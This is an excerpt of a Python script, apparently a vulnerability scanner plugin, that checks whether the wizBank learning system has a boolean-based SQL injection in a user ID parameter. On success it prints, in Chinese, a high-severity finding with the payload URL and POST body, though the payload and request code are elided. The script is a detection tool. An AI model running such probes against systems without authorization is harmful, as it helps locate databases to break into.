...
class wizbank_usr_id_sqli:
    ...
    def run(self):
        ...
        if r"true" in reqlst[0] and r"false" in reqlst[1]:
            if len(req.text) < 50:
                printGreen("[+]Success:存在wizBank学习系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4))
            else:
                printBlue("[-]Info:不存在wizbank_usr_id_sqli漏洞")
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wizbank_usr_id_sqli(sys.argv[1])
    testVuln.run()
